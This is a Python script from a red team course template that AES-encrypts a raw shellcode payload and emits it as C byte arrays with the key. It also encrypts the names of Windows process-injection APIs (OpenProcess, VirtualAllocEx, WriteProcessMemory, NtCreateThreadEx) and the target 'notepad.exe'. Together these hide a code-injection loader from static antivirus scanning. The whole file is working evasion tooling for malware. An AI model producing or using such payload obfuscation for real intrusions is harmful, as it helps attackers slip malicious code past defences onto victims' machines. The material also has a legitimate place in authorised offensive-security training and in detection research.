# Red Team Operator course code template
# payload encryption with AES
# 
# author: reenz0h (twitter: @SEKTOR7net)
# modified by: geobour98

import sys
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import hashlib

KEY = get_random_bytes(16)

def aesenc(plaintext, key):
    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    
    return ciphertext

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)

print('unsigned char payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
print('unsigned char key[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')

str_list = [b"notepad.exe", b"CloseHandle", b"CreateToolhelp32Snapshot", b"Process32First", b"Process32Next", b"lstrcmpiA", b"VirtualAllocEx", b"WriteProcessMemory", b"NtCreateThreadEx", b"WaitForSingleObjectEx", b"OpenProcess"]
for s in str_list:
    rext = os.path.splitext(s)[0]
    str = aesenc(s + b"\x00", KEY)
    print('unsigned char s' + rext.decode('utf-8') + '[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in str) + ' };')
    